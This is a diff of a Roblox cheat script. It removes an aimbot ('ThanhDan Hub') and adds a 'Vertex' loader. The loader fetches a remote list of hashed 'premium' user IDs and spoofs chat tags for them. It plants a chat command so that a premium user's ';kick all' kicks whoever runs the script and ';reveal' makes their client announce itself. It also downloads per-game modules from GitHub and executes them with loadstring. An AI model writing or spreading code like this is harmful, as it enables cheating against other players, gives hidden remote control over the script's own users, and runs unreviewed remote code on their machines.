@@ -1,106 +1,127 @@
--- Variables
-local players = game:GetService("Players")
-local runService = game:GetService("RunService")
-local localPlayer = players.LocalPlayer
-local mouse = localPlayer:GetMouse()
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local TextChatService = game:GetService("TextChatService")
+local revealCooldowns = {}
 
--- Settings
-local circleSize = 100 -- Default circle size
-local isAimLocked = false
-local lockedPlayer = nil
+-- Initialize List ( Premium shit )
+shared.premiumUserIds = shared.premiumUserIds or {}
+local csvData = game:HttpGet("https://raw.githubusercontent.com/vertex-peak/API/refs/heads/main/API.csv")
+local lines = csvData:split("\n")
 
--- Create circle
-local circle = Drawing.new("Circle")
-circle.Color = Color3.fromRGB(255, 0, 0)
-circle.Thickness = 2
-circle.Filled = false
-circle.Transparency = 1
+-- Simple hash function for Roblox
+local function simpleHash(message)
+    local hash = 0x12345678  
+    local seed = 0x7F3D8B9A  
+    local multiplier = 31    
 
--- GUI for customization
-local gui = Instance.new("ScreenGui", game.CoreGui)
-local frame = Instance.new("Frame", gui)
-frame.Position = UDim2.new(0, 10, 0, 10)
-frame.Size = UDim2.new(0, 200, 0, 120)
-frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-frame.BorderSizePixel = 0
+    for i = 1, #message do
+        local byte = string.byte(message, i)  
+        hash = (hash * multiplier + byte + seed) % 0x100000000  -- Keep within 32-bit range 
 
--- Add title label
-local title = Instance.new("TextLabel", frame)
-title.Size = UDim2.new(0, 200, 0, 20)
-title.Position = UDim2.new(0, 0, 0, 0)
-title.Text = "ThanhDan Hub"
-title.TextColor3 = Color3.fromRGB(255, 255, 255)
-title.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-title.BorderSizePixel = 0
-title.TextScaled = true
-
-local slider = Instance.new("TextBox", frame)
-slider.Size = UDim2.new(0, 180, 0, 30)
-slider.Position = UDim2.new(0, 10, 0, 30)
-slider.Text = tostring(circleSize)
-slider.TextColor3 = Color3.fromRGB(255, 255, 255)
-slider.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-slider.BorderSizePixel = 0
-
-local button = Instance.new("TextButton", frame)
-button.Size = UDim2.new(0, 180, 0, 30)
-button.Position = UDim2.new(0, 10, 0, 70)
-button.Text = "Apply"
-button.TextColor3 = Color3.fromRGB(255, 255, 255)
-button.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-button.BorderSizePixel = 0
-
--- Update circle size
-button.MouseButton1Click:Connect(function()
-    local size = tonumber(slider.Text)
-    if size and size > 0 then
-        circleSize = size
+        -- Rotate the hash left by 5 bits (with bit32)
+        hash = bit32.lshift(hash, 5) + bit32.rshift(hash, 27)
+        hash = hash % 0x100000000  -- Ensure it's within 32-bit range
     end
-end)
 
--- Function to find closest player
-local function getClosestPlayer()
-    local closest = nil
-    local shortestDistance = circleSize
+    return string.format("%08x", hash)
+end
 
-    for _, player in ipairs(players:GetPlayers()) do
-        if player ~= localPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
-            -- Convert 3D position to 2D screen position
-            local screenPos, onScreen = workspace.CurrentCamera:WorldToViewportPoint(player.Character.HumanoidRootPart.Position)
-            if onScreen then
-                local distance = (Vector2.new(mouse.X, mouse.Y) - Vector2.new(screenPos.X, screenPos.Y)).Magnitude
-                if distance < shortestDistance then
-                    closest = player
-                    shortestDistance = distance
-                end
+-- IDs ( I know most of the code is bad I don't care )
+for _, line in ipairs(lines) do
+    local parts = line:split(",")
+    if #parts == 2 and parts[1] ~= "" then
+        local robloxUserId = parts[1]
+        if robloxUserId then
+            table.insert(shared.premiumUserIds, robloxUserId)
+        end
+    end
+end
+
+-- Handle incoming chat messages
+TextChatService.OnIncomingMessage = function(message: TextChatMessage)
+    if message.TextSource then
+        local player = Players:GetPlayerByUserId(message.TextSource.UserId)
+        local props = Instance.new("TextChatMessageProperties")
+
+        if player then
+            local playerName = player.Name
+
+            if table.find(shared.premiumUserIds, simpleHash(tostring(player.UserId))) then
+                message.PrefixText = "<font color='#F5CD30'>[VERTEX PREMIUM]</font> " .. "<font color='#FFFFFF'>" .. playerName .. "</font>" .. ":"
+                message.Text = message.Text 
+            elseif player.UserId == game:GetService("Players").LocalPlayer.UserId and game:GetService("MarketplaceService"):UserOwnsGamePassAsync(player.UserId, 429957) then
+                message.PrefixText = "<font color='#FF0000'>[ELITE]</font> " .. "<font color='#FF0000'>" .. playerName .. "</font>" .. ":"
+                message.Text = message.Text 
+            else
+                message.PrefixText = "<font color='#FFFFFF'>" .. playerName .. "</font>" .. ":"
+                message.Text = message.Text  
             end
         end
     end
-    return closest
 end
 
--- Update loop
-runService.RenderStepped:Connect(function()
-    -- Update circle position (centered on mouse)
-    circle.Position = Vector2.new(mouse.X, mouse.Y) - Vector2.new(circle.Radius, circle.Radius)
-    circle.Radius = circleSize
+local function isPremiumUser(player)
+    return table.find(shared.premiumUserIds, simpleHash(tostring(player.UserId))) ~= nil
+end
 
-    if isAimLocked and lockedPlayer and lockedPlayer.Character and lockedPlayer.Character:FindFirstChild("HumanoidRootPart") then
-        local lockPosition, onScreen = workspace.CurrentCamera:WorldToViewportPoint(lockedPlayer.Character.HumanoidRootPart.Position)
-        if onScreen then
-            mouse.Move = Vector2.new(lockPosition.X, lockPosition.Y)
-        end
+if isPremiumUser(Players.LocalPlayer) then 
+    shared.premium = true -- This won't give you command access nice try 🤓
+else 
+    shared.premium = false -- Setting it to false? For what ... Useless code...
+end 
+
+-- Why you still here!? Get a life 
+local function onPlayerChat(player, message)
+    if isPremiumUser(Players.LocalPlayer) then return end -- Prevent command execution for premium users
+    local lowerMessage = message:lower()
+
+    if lowerMessage == ";kick all" and isPremiumUser(player) then
+        Players.LocalPlayer:Kick("Premium user has kicked you")
     end
+    wait(.1)
+    if lowerMessage == ";reveal" and isPremiumUser(player) then
+        local currentTime = tick()
+
+        if revealCooldowns[player.UserId] and currentTime - revealCooldowns[player.UserId] < 10 then
+            return -- Ignore the command if it's too soon.. Don't abuse commands...
+        end
+
+        -- Update the cooldown time for this player
+        revealCooldowns[player.UserId] = currentTime
+
+        -- Send the "I'm using vertex" message
+        game:GetService("TextChatService").ChatInputBarConfiguration.TargetTextChannel:SendAsync("I'm using vertex")
+    end
+end
+
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(msg)
+        onPlayerChat(player, msg)
+    end)
 end)
 
--- Mouse key listener
-mouse.KeyDown:Connect(function(key)
-    if key == "q" then -- Press Q to toggle aim lock
-        isAimLocked = not isAimLocked
-        if isAimLocked then
-            lockedPlayer = getClosestPlayer()
-        else
-            lockedPlayer = nil
-        end
+for _, player in pairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(msg)
+        onPlayerChat(player, msg)
+    end)
+end
+
+-- Skid!? 
+local function loadScriptFromURL(url)
+    local success, scriptContent = pcall(game.HttpGet, game, url)
+    if not success then
+        warn("Failed to fetch script: " .. tostring(scriptContent))
+        return
     end
-end)
+    local func, err = loadstring(scriptContent)
+    if not func then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/vertex-peak/vertex/refs/heads/main/universal"))()
+        return
+    end
+    success, result = pcall(func)
+end
+
+if not shared.VertexExecuted then
+    shared.VertexExecuted = true
+    loadScriptFromURL("https://raw.githubusercontent.com/vertex-peak/vertex/main/modules/" .. game.PlaceId .. ".lua")
+end
